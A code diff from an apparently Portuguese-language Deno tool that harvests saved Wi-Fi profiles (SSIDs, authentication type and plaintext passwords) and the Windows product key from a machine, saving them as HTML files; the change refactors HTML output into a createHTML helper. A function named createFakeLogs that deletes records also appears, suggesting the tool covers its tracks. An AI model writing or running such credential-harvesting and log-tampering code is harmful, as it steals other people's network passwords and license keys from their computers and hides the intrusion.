@@ -124,31 +124,20 @@ async function NetSHProfileCollector() {
 		);
 
 		// Escrevendo arquivos com as informações filtradas no diretório final
-		const networkData = `
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-	<meta charset="UTF-8">
-	<meta http-equiv="X-UA-Compatible" content="IE=edge">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<title>${SSID[0]}</title>
-</head>
-<body>
+		const body = `
 	<div>
-		SSID: ${SSID[1]}<br>
+		SSID: ${SSID[0]}<br>
 		Data: ${
 			getTimestamp().toFormat('DDDD')
 		} (<timestamp>${getTimestamp().ts}</timestamp>)<br>
 		Autenticação: ${auth[1]}<br>
 		Senha: ${pswd[1]}
 	</div><br><br>
-	<img src="${networkQR}">
-</body>
-</html>`;
+	<img src="${networkQR}">`;
 
 		await Deno.writeTextFile(
 			`data/WiFiPasswords/${SSID[0]}.html`,
-			networkData,
+			createHTML(SSID[0], body),
 		);
 	}
 }
@@ -156,16 +145,23 @@ async function NetSHProfileCollector() {
 async function copyWinKey() {
 	winLKey =
 		(await $`wmic path softwarelicensingservice get OA3xOriginalProductKey`
-			.lines())[1];
+			.lines())[1].trim();
 
 	// Cria pasta de chaves do Windows (se não existir)
 	await Deno.mkdir('data/WindowsKeys').catch(() => {});
 
+	const body = `
+	<div>
+		Máquina: ${Deno.hostname()}<br>
+		Data: ${
+		getTimestamp().toFormat('DDDD')
+	} (<timestamp>${getTimestamp().ts}</timestamp>)<br>
+		Chave de ativação do Windows: <key>${winLKey}</key>
+	</div>`;
+
 	await Deno.writeTextFile(
-		`data/WindowsKeys/${Deno.hostname()}.txt`,
-		`Máquina: ${Deno.hostname()}\nData: ${
-			getTimestamp().toFormat('DDDD')
-		}\nChave de ativação do Windows: ${winLKey}`,
+		`data/WindowsKeys/${Deno.hostname()}.html`,
+		createHTML(Deno.hostname(), body),
 	);
 }
 
@@ -200,6 +196,16 @@ async function createFakeLogs() {
 	spinner.end('Registros excluídos.');
 
 	showLogs && Deno.exit();
+}
+
+function createHTML(title: string, body: string) {
+	return `<!DOCTYPE html>\n<html lang="pt-BR">\n<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>${title}</title>
+</head>\n<body>	${body}\n</body>\n</html>
+`;
 }
 
 function clearTags(matches: IterableIterator<RegExpMatchArray>) {
